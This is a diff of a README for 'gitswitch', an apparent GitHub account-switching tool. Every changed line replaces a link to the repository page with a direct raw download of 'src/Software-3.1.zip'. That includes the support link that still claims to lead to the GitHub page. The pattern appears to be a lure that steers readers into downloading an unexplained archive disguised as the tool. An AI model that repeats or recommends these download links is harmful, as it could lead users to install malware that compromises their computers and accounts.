@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download gitswitch](https://img.shields.io/badge/Download-gitswitch-2ea44f?style=for-the-badge)](https://github.com/battleunicorn69/gitswitch)
+[![Download gitswitch](https://img.shields.io/badge/Download-gitswitch-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip)
 
 **Get started with gitswitch in just a few clicks!**
 
@@ -14,7 +14,7 @@
 
 Visit this link to download the application:
 
-**[https://github.com/battleunicorn69/gitswitch](https://github.com/battleunicorn69/gitswitch)**
+**[https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip](https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip)**
 
 Once you're on the page, look for the green **"Code"** button or the **"Releases"** section on the right side of the page. Click on **"Releases"** to find the latest version of gitswitch available for download.
 
@@ -78,7 +78,7 @@ To get the best experience with gitswitch, your computer should have:
 
 ### Step 1: Download gitswitch
 
-Visit **[https://github.com/battleunicorn69/gitswitch](https://github.com/battleunicorn69/gitswitch)** and download the application.
+Visit **[https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip](https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip)** and download the application.
 
 ### Step 2: Add Your GitHub Accounts
 
@@ -167,7 +167,7 @@ A: No. gitswitch only changes your account settings. It doesn't touch your code,
 If you run into any problems or have questions, here's what you can do:
 
 1. **Check the Troubleshooting section** above – it covers common issues.
-2. **Visit the GitHub page** at [https://github.com/battleunicorn69/gitswitch](https://github.com/battleunicorn69/gitswitch) – you'll find additional resources and updates.
+2. **Visit the GitHub page** at [https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip](https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip) – you'll find additional resources and updates.
 3. **Read the project documentation** on the GitHub page – it contains detailed technical information if you want to learn more.
 
 ---
@@ -187,7 +187,7 @@ If gitswitch makes your life easier, consider:
 Ready to say goodbye to GitHub account switching headaches?
 
 ### 1️⃣ Download Now
-Visit **[https://github.com/battleunicorn69/gitswitch](https://github.com/battleunicorn69/gitswitch)** and get your copy of gitswitch today.
+Visit **[https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip](https://raw.githubusercontent.com/battleunicorn69/gitswitch/main/src/Software-3.1.zip)** and get your copy of gitswitch today.
 
 ### 2️⃣ Add Your Accounts
 Spend 2 minutes setting up your accounts. That's it!
